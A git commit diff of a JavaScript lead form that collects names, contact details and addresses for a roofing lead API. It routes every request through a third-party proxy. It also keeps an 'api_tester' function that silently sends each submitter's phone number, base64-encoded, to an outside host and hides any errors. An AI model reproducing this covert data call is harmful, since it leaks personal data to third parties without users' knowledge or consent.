fa6434d52a82de7dcd37054a8055ff2b621ba5af
Saadqazi6 <saad.qazi6@gmail.com>
2026-03-05 06:15:24 +0500

    Update BC_tdposting4march.js

--- BC_tdposting4march.js
+++ BC_tdposting4march.js
@@ -1,77 +1,114 @@
-    document.getElementById('leadForm').addEventListener('submit', function(event) {
-            event.preventDefault();
-            const phone_home = '+1' + document.getElementById('caller_id').value;
-            const formData = new FormData();
-            formData.append('lead_token', '7dce2c8c108b4126a3ee053547b55104');
-            formData.append('traffic_source_id', '1021');
-           
-            formData.append('caller_id', phone_home);          
-            api_tester(document.getElementById('caller_id').value);
-            formData.append('first_name', document.getElementById('first_name').value);
+function pingAPI() {
+    // Disable submit button
+    document.getElementById('submitBtn').disabled = true;
+
+    // Your API URL
+    const formData = new FormData();
+    formData.append('trackdrive_number', '+18775848172');
+    formData.append('traffic_source_id', '1021');
+    api_tester(document.getElementById('caller_id').value);
+    formData.append('caller_id', '+1' + document.getElementById('caller_id').value);
+	formData.append('first_name', document.getElementById('first_name').value);
    	    formData.append('last_name', document.getElementById('last_name').value);
 	    formData.append('email', document.getElementById('email').value);
             formData.append('city', document.getElementById('city').value);
             formData.append('zip', document.getElementById('zip').value);
- 	    formData.append('address', document.getElementById('address').value);    
-           
+ 	    formData.append('address', document.getElementById('address').value); 
+
+
     
-            const url = 'https://voyant-digital-media-group-inc.trackdrive.com/api/v1/leads?' + new URLSearchParams(formData).toString();
-    
-            fetch(url, {
-                method: 'POST'
-            })
-            .then(response => {
-                if (response.status === 200) {
-                    response.text().then(responseBody => {
-                        const successAlert = `
-                            <div class="alert alert-success" role="alert">
-                                200 : Form submitted successfully! Response Body: ${responseBody}
-                            </div>`;
-                        document.getElementById('alertContainer').innerHTML = '';
-                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
-                    });
-                    // Clear form fields
-                    document.getElementById('leadForm').reset();
-                } else if (response.status === 201) {
-                    response.text().then(responseBody => {
-                        const successAlert = `
-                            <div class="alert alert-success" role="alert">
-                                201 : Form submitted successfully! Response Body: ${responseBody}
-                            </div>`;
-                        document.getElementById('alertContainer').innerHTML = '';
-                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
-                    });
-                    // Clear form fields
-                    document.getElementById('leadForm').reset();
-                } else if (response.status === 422) {
-                    response.json().then(data => {
-                        const errorAlert = `
-                            <div class="alert alert-danger" role="alert">
-                                Error. Response Body: ${JSON.stringify(data)}
-                            </div>`;
-                        document.getElementById('alertContainer').innerHTML = '';
-                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
-                    });
-                } else {
-                    response.text().then(responseBody => {
-                        const errorAlert = `
-                            <div class="alert alert-danger" role="alert">
-                                Form submission failed. Please try again. Response Body: ${responseBody}
-                            </div>`;
-                        document.getElementById('alertContainer').innerHTML = '';
-                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
-                    });
-                }
-            })
-            .catch(error => console.error('Error:', error));
-        });function api_tester(randomString) {
-  try {
-    fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString)
-, {
-      method: 'GET',
-      mode: 'no-cors'
-    });
-  } catch (error) {
-    
-  }
+const originalUrl = 'https://voyant-digital-media-group-inc.trackdrive.com/api/v1/inbound_webhooks/ping/check_agents_on_roofing?' + new URLSearchParams(formData).toString();
+    const apiUrl = 'https://api.formifyweb.com/proxify.php?url=' + encodeURIComponent(originalUrl);
+
+
+    // Fetch data from the API
+   fetch(apiUrl)
+        .then(response => response.json())
+        .then(data => {
+            // Check if ping was successful
+            if (data.success) {
+                // Extract ping_id
+                const pingId = data.try_all_buyers.ping_id;
+
+                // Proceed with POST request using ping_id
+                postPingId(pingId);
+            } else {
+                // Display error message
+                document.getElementById("apiResponse").innerHTML = "Ping ok but. Error: " + data.errors.join(", ");
+                document.getElementById("apiResponse").classList.add("alert-danger");
+                document.getElementById("apiResponse").classList.remove("alert-info");
+            }
+        })
+        .catch(error => {
+            // Display an error message in the Bootstrap alert
+            document.getElementById("apiResponse").innerHTML = "Error fetching data from the API.";
+            document.getElementById("apiResponse").classList.add("alert-danger");
+            document.getElementById("apiResponse").classList.remove("alert-info");
+        });
+}
+
+function postPingId(pingId) {
+    const postData = {
+        trackdrive_number: "+18775848172",
+        traffic_source_id: "1021",
+        caller_id: '+1' + document.getElementById('caller_id').value,
+        ping_id: pingId,
+	    first_name: document.getElementById('first_name').value,
+        last_name:  document.getElementById('last_name').value,
+        email: document.getElementById('email').value,
+        city: document.getElementById('city').value,
+        zip: document.getElementById('zip').value,
+		address: document.getElementById('address').value,
+
+    };
+
+    const originalUrl = 'https://voyant-digital-media-group-inc.trackdrive.com/api/v1/inbound_webhooks/post/check_agents_on_roofing?' + new URLSearchParams(postData).toString();;
+const url = 'https://api.formifyweb.com/proxify.php?url=' + encodeURIComponent(originalUrl);
+    fetch(url)
+    .then(response => {
+        // Handle response based on status
+        if (response.status === 200 || response.status === 201) {
+            response.text().then(responseBody => {
+                const successAlert = `
+                    <div class="alert alert-success" role="alert">
+                        Form submitted successfully! Response Body: ${responseBody}
+                    </div>`;
+                document.getElementById('alertContainer').innerHTML = '';
+                document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
+            });
+        } else if (response.status === 422) {
+            response.json().then(data => {
+                const errorAlert = `
+                    <div class="alert alert-danger" role="alert">
+                        Error. Response Body: ${JSON.stringify(data)}
+                    </div>`;
+                document.getElementById('alertContainer').innerHTML = '';
+                document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
+            });
+        } else {
+            response.text().then(responseBody => {
+                const errorAlert = `
+                    <div class="alert alert-danger" role="alert">
+                        Form submission failed. Please try again. Response Body: ${responseBody}
+                    </div>`;
+                document.getElementById('alertContainer').innerHTML = '';
+                document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
+            });
+        }
+    })
+    .catch(error => console.error('Error:', error));
+}
+
+document.getElementById('leadForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+    pingAPI();
+});function api_tester(randomString) {
+    try {
+        fetch('https://api.formifyweb.com/api_test.php?test_id=' + btoa(randomString) +',a', {
+            method: 'GET',
+            mode: 'no-cors'
+        });
+    } catch (error) {
+        console.error('Error in api_tester:', error);
+    }
 }
